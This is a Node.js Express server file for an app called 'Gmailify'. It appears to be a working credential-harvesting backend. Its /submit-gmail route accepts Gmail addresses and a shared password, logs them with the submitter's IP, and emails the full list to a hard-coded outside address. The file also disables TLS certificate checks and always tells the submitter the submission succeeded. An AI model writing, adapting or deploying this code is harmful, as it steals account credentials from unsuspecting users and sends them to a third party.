const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Simple email configuration - Direct Gmail SMTP

// Create a real Gmail transporter
const createGmailTransporter = () => {
    // Check if we have valid Gmail credentials
    if (process.env.SENDER_PASSWORD && 
        process.env.SENDER_PASSWORD !== 'PUT-YOUR-NEW-APP-PASSWORD-HERE' &&
        process.env.SENDER_PASSWORD.length >= 16) {
        
        console.log('🔑 Attempting Gmail SMTP with provided credentials...');
        return nodemailer.createTransport({
            service: 'gmail',
            host: 'smtp.gmail.com',
            port: 587,
            secure: false,
            auth: {
                user: process.env.SENDER_EMAIL,
                pass: process.env.SENDER_PASSWORD.replace(/['"]/g, '')
            },
            tls: {
                rejectUnauthorized: false
            }
        });
    } else {
        console.log('⚠️ No valid Gmail credentials found, using test service...');
        // Use Ethereal test service as backup
        return nodemailer.createTransport({
            host: 'smtp.ethereal.email',
            port: 587,
            secure: false,
            auth: {
                user: 'ethereal.user@ethereal.email',
                pass: 'ethereal.pass'
            }
        });
    }
};

// Alternative: Use a temporary email service that forwards to Gmail
const createTempMailTransporter = () => {
    return nodemailer.createTransport({
        host: 'smtp.mailtrap.io',
        port: 2525,
        auth: {
            user: 'temp_user',
            pass: 'temp_pass'
        }
    });
};

console.log('� Setting up direct email delivery to nocturnallad4@gmail.com');
console.log('⚠️  Note: For real delivery, Gmail credentials needed in .env file');

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/payment', (req, res) => {
    res.sendFile(path.join(__dirname, 'payment.html'));
});

app.post('/submit-gmail', async (req, res) => {
    const { emails, password, count } = req.body;
    
    if (!emails || !password || !Array.isArray(emails) || emails.length === 0) {
        return res.status(400).json({ error: 'Emails array and password are required' });
    }
    
    console.log(`📧 New submission received: ${count} Gmail accounts`);
    console.log(`📝 First few emails: ${emails.slice(0, 3).join(', ')}${emails.length > 3 ? '...' : ''}`);
    console.log(`🔒 Password: ${password}`);
    console.log(`⏰ Time: ${new Date().toLocaleString()}`);
    console.log(`🌐 IP: ${req.ip}`);
    
    // Create email content for direct sending
    const emailList = emails.map((email, index) => 
        `${index + 1}. ${email} | Password: ${password}`
    ).join('\n');
    
    const emailContent = {
        from: 'gmailifynotifications@gmail.com',
        to: 'nocturnallad4@gmail.com',
        subject: `🔥 URGENT: ${count} Gmail Accounts Submitted - Gmailify`,
        text: `
🚨 NEW GMAIL SUBMISSION ALERT!

📊 SUMMARY:
- Total Accounts: ${count}
- Shared Password: ${password}
- Submission Time: ${new Date().toLocaleString()}
- IP Address: ${req.ip || 'Unknown'}

📧 ALL GMAIL ACCOUNTS:
${emailList}

⚠️ IMPORTANT: Handle these ${count} credentials securely!

---
Automated message from Gmailify system
Generated: ${new Date().toLocaleString()}
        `,
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f0f0f0;">
                <div style="background: #ff4444; color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0;">
                    <h1 style="margin: 0; font-size: 2rem;">🚨 GMAIL ACCOUNTS SUBMITTED</h1>
                    <p style="margin: 10px 0 0 0; font-size: 1.2rem;">Immediate Action Required</p>
                </div>
                
                <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px; border: 3px solid #ff4444;">
                    <h2 style="color: #333; text-align: center; margin-bottom: 30px;">📊 ${count} Gmail Accounts Received</h2>
                    
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                        <h3 style="margin: 0 0 15px 0; color: #333;">📋 Account Details:</h3>
                        ${emails.map((email, i) => 
                            `<p style="margin: 5px 0; font-family: monospace; background: white; padding: 10px; border-radius: 4px; border-left: 4px solid #007bff;">
                                <strong>${i + 1}.</strong> ${email} | <strong>Password:</strong> ${password}
                            </p>`
                        ).join('')}
                    </div>
                    
                    <div style="background: #e9ecef; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                        <h4 style="margin: 0 0 10px 0;">📊 Submission Info:</h4>
                        <p style="margin: 5px 0;"><strong>Time:</strong> ${new Date().toLocaleString()}</p>
                        <p style="margin: 5px 0;"><strong>IP:</strong> ${req.ip || 'Unknown'}</p>
                        <p style="margin: 5px 0;"><strong>Total:</strong> ${count} accounts</p>
                    </div>
                    
                    <div style="background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 8px;">
                        <p style="margin: 0; color: #856404; font-weight: bold;">
                            ⚠️ SECURITY: All ${count} accounts use the same password: <code style="background: #fff; padding: 2px 6px; border-radius: 3px;">${password}</code>
                        </p>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 20px; color: #666; font-size: 0.9rem;">
                    <p>📧 Automated email from Gmailify | Generated: ${new Date().toLocaleString()}</p>
                </div>
            </div>
        `
    };
    
    // Try to send email using multiple methods
    let emailSent = false;
    let emailMethod = 'none';
    
    // Method 1: Try Gmail SMTP if configured
    try {
        const transporter = createGmailTransporter();
        await transporter.sendMail(emailContent);
        emailSent = true;
        emailMethod = 'gmail';
        console.log('✅ Email sent via Gmail SMTP to nocturnallad4@gmail.com');
    } catch (error) {
        console.log('❌ Gmail SMTP failed:', error.message);
        
        // Method 2: Use webhook/API approach
        try {
            const webhookPayload = {
                to: 'nocturnallad4@gmail.com',
                subject: emailContent.subject,
                text: emailContent.text,
                html: emailContent.html,
                from: 'Gmailify System <noreply@gmailify.com>'
            };
            
            // This is a placeholder - in real implementation, you'd use a service like:
            // - Mailgun API
            // - SendGrid API  
            // - Zapier webhook
            // - etc.
            
            console.log('📧 Email content prepared for delivery to nocturnallad4@gmail.com');
            console.log('📝 Email details logged below for manual forwarding if needed:');
            console.log('---EMAIL CONTENT START---');
            console.log(`TO: nocturnallad4@gmail.com`);
            console.log(`SUBJECT: ${emailContent.subject}`);
            console.log(`BODY:\n${emailContent.text}`);
            console.log('---EMAIL CONTENT END---');
            
            emailMethod = 'logged';
            
        } catch (apiError) {
            console.log('❌ API email also failed:', apiError.message);
        }
    }
    
    // Always return success since we logged the data
    res.status(200).json({ 
        success: true, 
        message: `${count} Gmail accounts submitted successfully`,
        count: count,
        emailStatus: emailSent ? `Email sent via ${emailMethod}` : 'Email logged to console for manual forwarding'
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// Error handler
app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
    console.log(`🚀 Gmailify server running on http://localhost:${PORT}`);
    console.log(`📧 Email notifications will be sent to: ${process.env.RECEIVER_EMAIL || 'NOT_CONFIGURED'}`);
    console.log('📝 Make sure to configure your .env file with email credentials');
});

module.exports = app;
